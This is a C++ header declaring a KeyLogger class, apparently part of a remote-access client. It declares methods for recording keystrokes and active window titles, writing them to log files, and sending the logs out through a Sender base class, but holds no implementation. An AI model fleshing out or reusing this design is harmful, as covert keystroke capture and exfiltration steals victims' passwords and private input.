#ifndef CLIENT_KEYLOGGER_H
#define CLIENT_KEYLOGGER_H

#include <iostream>
#include <fstream>
#include <string>
#include <fstream>
#include <atomic>
#include <thread>

#include "Stream.h"
#include "TimeCS.h"
#include "Install.h"
#include "Converter.h"
#include "Sender.h"
#include "configuration.h"



class KeyLogger : public Sender {

public:
    explicit KeyLogger(const Stream &stream);
    void sendLastKeyloggerLog();
    void sendAll();
    void tryStart();
    void send() override;
    void setStream(const Stream &);
private:
    [[nodiscard]] bool lastLogExists() const;
    [[nodiscard]] bool logsExists() const;
    void start();
    std::wstring pathOfLogs;
    std::wstring logsFileName;
    std::atomic<bool> recordingKeys = false;
    std::string tempWindow;
    static std::string getCurrentWindow();
    static bool checkShift();
    static bool checkAltGr();
    void writeCharIntoLogFile(const char *string);
    void writeCharIntoLogFile(char string);
    std::wstring generateLogName();
};


#endif
